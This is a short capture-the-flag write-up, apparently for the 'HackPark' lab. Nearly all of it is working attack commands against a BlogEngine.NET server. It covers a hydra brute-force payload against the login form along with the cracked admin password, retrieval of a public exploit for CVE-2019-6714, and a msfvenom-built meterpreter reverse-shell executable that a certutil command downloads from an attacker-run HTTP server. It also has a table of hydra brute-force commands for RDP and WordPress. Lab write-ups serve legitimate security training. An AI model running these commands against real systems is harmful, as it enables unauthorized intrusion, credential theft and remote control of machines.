# HackPark

## Task2 

Finding login directory with gobuster

```bash
gobuster dir -u http://Target_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The login page is located at http://ip/admin.
To bruteforce the account we need to use hydra

```bash
hydra -v -l admin -P /usr/share/wordlists/rockyou.txt [machineIP] http-post-form "/Account/login.aspx:__VIEWSTATE=%2BzSkE5rKklYx2evyff1oZJyuSWT7%2FP%2BrwCqOuY9eQFnN3I9b9H%2FemK0b4edjD%2BX4D0kYN6MJXUIltXwXt0PReeyBxoseUQg%2BlNpW6CHIGWNzl%2FGSvdwSZX179PJ%2FI3%2F64LNM7KzKj9sc4BMO83WdCE0KH%2FPjXAKd4RAQ7poy1tOiO7cd&__EVENTVALIDATION=8UPWUPAn6s7hJvO0Pl8kCCO3NAmIgs7nlpsgIlY%2FBUKl7fwtvPmUalPJ5PygYkVuz1H356PzRXwi%2FHQ3z8iJpgXHs8%2BloBQ4qlIePP6FdcvcR2qoLptuS0C5xNkNhrzvN5IJshWQx%2BF3kjK4PfMhuSyiPjbKZA2aFsYrqvz5b2BHveGR&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```


```bash
USER=admin
PASS=1qaz2wsx
```

Other hydra command:

| Command                                                                                         | Description                                                                                              |
|-------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------|
| `hydra -P <wordlist> -v <ip> <protocol>`                                                        | Brute force against a protocol of your choice                                                           |
| `hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>`                  | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts) |
| `hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`                                       | Attack a Windows Remote Desktop with a password list.                                                   |
| `hydra -l <username> -P <password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | Craft a more specific request for Hydra to brute force.                                                 |
## Task3 

```bash
searchsploit blogengine
searchsploit -m 46353
cp 46353.cs PostView.ascx

```

CVE-2019-6714


## Task4 

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell.exe

python3 -m http.server

msfconsole
>use exploit/multi/handler
>set PAYLOAD windows/meterpreter/reverse_tcp
>set LHOST your-thm-ip
>set LPORT listening-port
>run
```

```cmd 
certutil -urlcache -split -f http://Target_IP:8000/shell.exe C:\Windows\Temp\shell.exe

```

